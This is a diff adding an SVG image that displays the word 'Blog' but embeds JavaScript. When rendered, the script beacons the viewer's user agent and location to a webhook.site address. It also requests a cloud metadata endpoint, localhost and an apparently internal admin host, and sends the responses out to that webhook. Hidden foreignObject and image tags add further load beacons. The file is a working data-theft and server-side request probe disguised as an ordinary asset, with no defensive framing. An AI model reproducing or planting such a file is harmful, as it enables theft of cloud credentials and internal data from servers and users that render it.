@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300" viewBox="0 0 300 300">
+  <rect width="300" height="300" fill="#f0f0f0"/>
+  <text x="150" y="150" text-anchor="middle" font-size="20">Blog</text>
+  <script type="text/javascript">
+    var wh = "https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476";
+    new Image().src = wh + "/svg-js-exec?ua=" + encodeURIComponent(navigator.userAgent || "no-ua") + "&amp;loc=" + encodeURIComponent(self.location || "no-loc");
+    var t = [
+      ["meta", "http://169.254.169.254/computeMetadata/v1/?recursive=true"],
+      ["lo80", "http://localhost/"],
+      ["vhadm", "http://vh-admin.dzen.ru/"]
+    ];
+    t.forEach(function(e) {
+      var x = new XMLHttpRequest();
+      x.open("GET", e[1], true);
+      x.onload = function() { new Image().src = wh + "/svg-" + e[0] + "?d=" + encodeURIComponent(x.responseText.substring(0, 1500)); };
+      x.onerror = function() { new Image().src = wh + "/svg-" + e[0] + "-err"; };
+      x.send();
+    });
+  </script>
+  <foreignObject width="1" height="1">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <img src="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/svg-fo-load" style="display:none"/>
+    </body>
+  </foreignObject>
+  <image xlink:href="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/svg-image-load" width="1" height="1"/>
+</svg>
